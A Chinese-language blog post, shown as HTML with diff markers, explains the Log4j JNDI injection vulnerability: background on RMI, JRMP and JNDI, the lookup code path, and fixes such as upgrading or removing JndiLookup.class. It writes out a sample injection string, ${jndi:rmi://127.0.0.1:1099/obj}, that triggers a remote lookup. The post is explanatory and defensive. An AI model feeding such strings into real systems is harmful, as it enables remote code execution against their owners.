+<p>复现之后才发现，这个漏洞的可怕之处。很多人都会在controller代码里面使用日志打印一下用户的传参，一旦用户在表单或者json中加入恶意参数，就会被触发。</p>
+<h4 id="2攻击原理">2.攻击原理</h4>
+<p>复现之后，接下来打破黑盒，来看一下这一次安全漏洞背后的原理。</p>
+<p>概念介绍：</p>
+<ul>
+<li>RMI</li>
+</ul>
+<p>以下是wiki的描述：</p>
+<pre tabindex="0"><code>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。
+
+Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。
+</code></pre><p>根据wiki所说RMI全称为Remote Method Invocation，也就是远程方法调用，通俗点解释，就是跨越jvm，调用一个远程方法。众所周知，一般情况下java方法调用
+指的是同一个jvm内方法的调用，而RMI与之恰恰相反。</p>
+<p>例如我们使用浏览器对一个http协议实现的接口进行调用，这个接口调用过程我们可以称之为Interface Invocation，而RMI的概念与之非常相似，只不过RMI调用的是一个Java方法，而浏览器调用的是一个http接口。并且Java中封装了RMI的一系列定义。RMI是一种行为，这种行为指的是Java远程方法调用。</p>
+<ul>
+<li>JRMP</li>
+</ul>
+<p>以下是wiki的描述：</p>
+<pre tabindex="0"><code>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。
+</code></pre><p>根据wiki所说JRMP全称为Java Remote Method Protocol，也就是Java远程方法协议，通俗点解释，它就是一个协议，一个在TCP/IP之上的线路层协议，一个RMI的过程，是用到JRMP这个协议去组织数据格式然后通过TCP进行传输，从而达到RMI，也就是远程方法调用。</p>
+<p>还是前面所说的例子，我们在使用浏览器进行访问一个网络上的接口时，它和服务器之间的数据传输以及数据格式的组织，是用到基于TCP/IP之上的HTTP协议，只有通过这个HTTP协议，浏览器和服务端约定好的一个协议，它们之间才能正常的交流通讯。而JRMP也是一个与之相似的协议，只不过JRMP这个协议仅用于Java RMI中。</p>
+<p>总结的来说：JRMP是一个协议，是用于Java RMI过程中的协议，只有使用这个协议，方法调用双方才能正常的进行数据交流。</p>
+<ul>
+<li>JNDI</li>
+</ul>
+<p>以下是wiki的描述：</p>
+<pre tabindex="0"><code>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。
+</code></pre><p>根据wiki的描述，JNDI全称为Java Naming and Directory Interface，也就是Java命名和目录接口。既然是接口，那么就必定有其实现，而目前我们Java中使用最多的基本就是rmi和ldap的目录服务系统。而命名的意思就是，在一个目录系统，它实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。而目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而JNDI中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象。</p>
+<p>总结的来说：JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。</p>
+<p>log4j攻击的入口为logIfEnabled，当log.info()方法打印${jndi:rmi://127.0.0.1:1099/obj}时，log4j内部会对{}进行匹配并识别</p>
+<p><img src="https://raw.githubusercontent.com/yeshadoo/blog-images/master/img/image-20230912175024579.png" alt="image-20230912175024579"></p>
+<p>识别后解析出特殊字符串jndi:rmi://127.0.0.1:1099/obj</p>
+<p>继续执行查询操作，调用lookup方法：</p>
+<p><img src="https://raw.githubusercontent.com/yeshadoo/blog-images/master/img/image-20230912175037643.png" alt="image-20230912175037643"></p>
+<p>lookup方法使用JNDI+RMI来进行远端服务器方法的调用</p>
+<h4 id="3修复方式">3.修复方式</h4>
+<ul>
+<li>最直接、有效、稳定的修复方式是：将 log4j-core 升级到 2.15.0 版本</li>
+<li>直接删除log4j中存在漏洞的类</li>
+</ul>
+<pre tabindex="0"><code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+</code></pre><ul>
+<li>通过配置禁用掉log4j的lookup功能</li>
+</ul>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              <br/><br/><p>Subscribe：<a target="_blank" href="https://mailchi.mp/a1a0d59e7a19/joway"><b>Mailchimp</b></a></p><br/><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://blog.joway.io/images/cc.png" /></a>
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+          <div class="post-comments">
+            <div id="disqus_thread"></div>
+<script>
+  window.addEventListener("load", () => {
+    (function() {
+      
+      var d = document,
+        s = d.createElement("script");
+      s.src = "https://joway.disqus.com/embed.js";
+      s.setAttribute("data-timestamp", +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  });
+</script>
+<noscript
+  >Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript"
+    >comments powered by Disqus.</a
+  ></noscript
+>
+
+          </div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+<script src="/js/lazyload.min.js"></script>
+<script>
+  var lazyImage = new LazyLoad({
+    container: document.getElementById('article')
+  });
+</script>
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
